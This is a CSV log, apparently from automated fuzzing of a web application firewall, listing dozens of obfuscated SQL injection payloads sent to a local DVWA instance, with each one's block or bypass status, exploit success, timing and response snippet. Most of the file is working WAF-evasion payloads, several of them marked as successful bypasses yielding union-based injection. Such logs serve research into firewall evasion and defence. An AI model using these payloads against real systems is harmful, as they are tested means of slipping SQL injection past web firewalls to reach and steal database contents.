Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=.1%0bor+!+true=+(!%0btrue)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0222,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+!%0b{x%0b(select+1)}=1=%0b(not+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0442,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not+{x+(select+1)}=1=+(!+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0305,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||+not+{`if`+1}=1=+(!%0b{`if`%0b1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0181,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+not+{a%0b1}=1=%0b(!~0),Bypassed,No,None,Unknown,0.0254,70.71,No,500,
0'<@=1%0bor%0b!+{`if`%0b1}=1=%0b(!+{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0254,70.71,No,500,
0'<@!=1+or+false=+(not+{x+(select+1)}=1),Blocked,No,None,booleanAtk,0.0092,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+!+{x%0b(select%0b1)}=1=+(not%0b{x,Bypassed,No,None,Unknown,0.0263,70.71,No,500,
0'<@!=.1%0bor+!+{x%0b(select+1)}=1=%0b(!+{a,Bypassed,No,None,Unknown,0.0227,70.71,No,500,
0'<@=.1+||%0bnot%0btrue=%0b(not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0132,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or+not+{x+(select%0b1)}=1=%0b(!%7efalse,Blocked,No,None,booleanAtk,0.0137,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or+not+1=%0b(not+{x%0b(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0184,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+not%0b{x+(select+1)}=1=%0b(!~false,Bypassed,Yes,Yes (unionAtk),Unknown,0.0721,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0b!%0btrue=+(not%0b{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0483,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0b||+not+1%0bis+false+or',Bypassed,No,None,booleanAtk,0.0207,70.71,No,500,
0%27<@=1+||%0bnot+{x+(select+1)}=1=+(not+,Blocked,No,None,Unknown,0.0095,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+||%0bfalse=+(not+{a%0b1}=1)+or,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0235,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot+{x+(select+1)}=1=+(!%0b,Blocked,No,None,Unknown,0.0144,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||+{x+(select+1)}=1+like%0b{x+(select+1)}=1%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0193,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+not%0btrue=+(not%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0315,70.71,No,500,
0'<@=.1%0b||%0bnot+{a+1}=1=+(not+true),Bypassed,No,None,Unknown,0.0347,70.71,No,500,
0%27<@=1+||+not%0b{x%0b(select%0b1)}=1=+(!+{a,Bypassed,Yes,Yes (unionAtk),Unknown,0.0159,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+!+{a%0b1}=1=+(not%0b{x%0b,Bypassed,No,None,Unknown,0.0184,71.01,No,500,
0'<@!=1.+||+!~0=+(!+{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0258,71.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0b!+{x+(select%0b1)}=1=%0b(not+{`if`,Blocked,No,None,Unknown,0.0201,71.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+not%0b{x%0b(select+1)}=1=+(not%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0192,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||%0b1<@%0bor+not%0b{x+(select+1)}=1=+(!,Blocked,No,None,Unknown,0.0083,71.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0bnot%0b{x+(select+1)}=1=+(not~false,Blocked,No,None,Unknown,0.0201,71.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+not+{a+1}=1=%0b(!+{x+(select,Bypassed,No,None,Unknown,0.0161,71.01,No,500,
0'<@=1.%0bor+!%0b1=+(not+{a+1}=1),Bypassed,No,None,Unknown,0.0383,71.01,No,500,
0'<@!=1.+or+!%0b{`if`+1}=1=%0b(false)%0b||,Bypassed,No,None,booleanAtk,0.0268,71.01,No,500,
0'<@!=.1%0b||%0b!%0b{x+(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0188,71.12,No,500,
0%27<@=.1%0bor+!%0b{a%0b1}=1=%0b(!+{x%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0184,71.24,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+!@<@.+or+not+{a%0b1}=1=%0b(!+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0315,71.24,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+!+{`if`%0b1}=1=+(not+{x%0b,Bypassed,No,None,Unknown,0.0367,71.24,No,500,
0'<@=.1%0b||+!+{x%0b(select+1)}=1=+(not~0,Bypassed,No,None,Unknown,0.014,69.31,No,500,
0'<@=1.+or+!+{x%0b(select%0b1)}=1=+(!+,Bypassed,No,None,Unknown,0.0325,70.1,No,500,
0%27<@=1+or%0bnot+true=+(!%0btrue)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0238,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||%0b!+{`if`%0b1}=1=+(not%7efalse),Bypassed,No,None,Unknown,0.027,70.1,No,500,
0'<@!=.1%0b||+!%0b{x+(select%0b1)}=1=+(not%0b{a,Bypassed,No,None,Unknown,0.0271,70.1,No,500,
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+(not+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0248,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+!+{`if`+1}=1=+(!%7e0),Bypassed,Yes,Yes (unionAtk),Unknown,0.0239,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+@<@.+||+{x+(select+1)}=1%0blike+{a+1}=1,Blocked,No,None,Unknown,0.0234,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||+false=%0b(not+{a%0b1}=1)%0bor,Bypassed,No,None,booleanAtk,0.0163,70.1,No,500,
0'<@=.1%0bor%0b!%0b{a+1}=1=%0b(not%0b{a+1}=1,Bypassed,No,None,Unknown,0.0394,70.4,No,500,
0'<@!=.1%0b||%0bfalse=+(not+{a+1}=1)+||,Bypassed,No,None,Unknown,0.0287,70.71,No,500,
0'<@=1.+||%0bnot~false=+(!+true)%0bor,Blocked,No,None,booleanAtk,0.02,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor+{x+(select%0b1)}=1%0blike+{`if`+1}=1%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0314,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0bnot%0b{x+(select+1)}=1=+(!+,Blocked,No,None,Unknown,0.01,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or+not%0b{x+(select+1)}=1=+(!+{x,Bypassed,No,None,Unknown,0.0219,70.71,No,500,
0%27<@=.1+||+not+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0183,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b{a%0b1}=1+like%0b{`if`+1}=1%0bor',Bypassed,No,None,Unknown,0.0523,70.71,No,500,
0%27or+@<@.+or%0bnot%0b{x+(select+1)}=1=%0b(!,Bypassed,Yes,Yes (unionAtk),Unknown,0.0255,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+not+{x%0b(select%0b1)}=1=+(!+{`if`,Bypassed,No,None,Unknown,0.0083,70.71,No,500,
0%27<@!=1.%0b||+!+{`if`%0b1}=1=%0b(!%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0158,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0bnot+{x+(select%0b1)}=1=+(!%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0145,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||+not%0b{x%0b(select+1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.0261,70.71,No,500,
